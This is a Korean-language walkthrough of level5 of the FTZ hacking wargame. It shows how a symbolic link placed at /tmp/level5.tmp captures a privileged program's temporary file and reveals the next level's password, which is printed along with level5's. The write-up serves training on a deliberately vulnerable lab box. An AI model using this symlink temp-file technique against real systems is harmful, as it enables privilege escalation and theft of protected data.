PW : `what is your name`

```bash
[level5@ftz level5]$ cat hint

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.
```

우선 level5프로그램을 실행해보면 아무런 출력없이 정상 종료 된다.
```bash
[level5@ftz level5]$ level5
[level5@ftz level5]$ echo $?
0
```
하지만 `/tmp/`폴더를 확인해보면 아무것도 없다.
```bash
[level5@ftz level5]$ ls /tmp/ -la
total 8
drwxrwxrwt    2 root     root         4096 May 22 08:29 .
drwxr-xr-x   20 root     root         4096 May 22 08:18 ..
srwxrwxrwx    1 mysql    mysql           0 May 22 08:19 mysql.sock
```
단지 `mysql.sock`파일만 있지만 이것도 빈 파일(용량이 0)이기 때문에 아무 상관이 없어 보인다.

그럼 추측해보기로는 파일이 생성되긴 하지만 프로그램 종료시에 바로 삭제 되는 것 같은데... 이것을 어떻게 해야 할지 생각해 봤다.

이는 심볼릭링크를 사용하면 해결된다.

심볼릭 링크는 아래와 같이 생성한다
```bash
$ ln -s [원본] [링크 파일]
```
`-s`옵션은 심볼릭 링크를 생성한다는 뜻이다

우선 아무 파일을 `~/tmp/` 폴더에 만들어 준 다음
심볼링 링크를 `/tmp/`폴더에 `level5.tmp`라는 이름으로 만들어 주면 될 것이다.

```bash
[level5@ftz tmp]$ pwd
/home/level5/tmp
[level5@ftz tmp]$ touch test
[level5@ftz tmp]$ cd /tmp/
[level5@ftz tmp]$ ln -s ~/tmp/test ./level5.tmp
[level5@ftz tmp]$ ls -al
total 8
drwxrwxrwt    2 root     root         4096 May 22 09:19 .
drwxr-xr-x   20 root     root         4096 May 22 08:18 ..
lrwxrwxrwx    1 level5   level5         21 May 22 09:19 level5.tmp -> /home/level5/tmp/test
srwxrwxrwx    1 mysql    mysql           0 May 22 08:19 mysql.sock
```
보면 level5.tmp파일이 test파일을 잘 가리키고 있음을 볼 수 있다.

그리고서 level5프로그램을 실행시켜주면 잘 남아있다.
```
[level5@ftz tmp]$ cat level5.tmp
next password : what the hell
```
level6의 패스워드는 `what the hell`이다.